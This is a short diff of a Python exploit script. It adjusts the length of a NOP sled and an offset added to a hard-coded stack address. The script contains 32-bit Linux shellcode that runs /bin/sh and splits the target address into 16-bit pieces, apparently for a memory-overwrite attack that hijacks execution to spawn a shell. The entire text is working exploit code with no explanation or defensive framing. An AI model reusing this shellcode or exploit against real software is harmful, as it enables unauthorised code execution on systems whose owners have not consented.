@@ -1,6 +1,6 @@
 import sys
 import os
-NOPSLED = b'\x90' * 0x1C
+NOPSLED = b'\x90' * 0x1A
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
 
@@ -9,7 +9,7 @@ ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
-ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 100
+ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 0xF94F
 ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[4:6], 'little')
 ADDRESSOFSHELL3 = int.from_bytes(ADDRESSOFSHELL[2:4], 'little')
 ADDRESSOFSHELL4 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little')
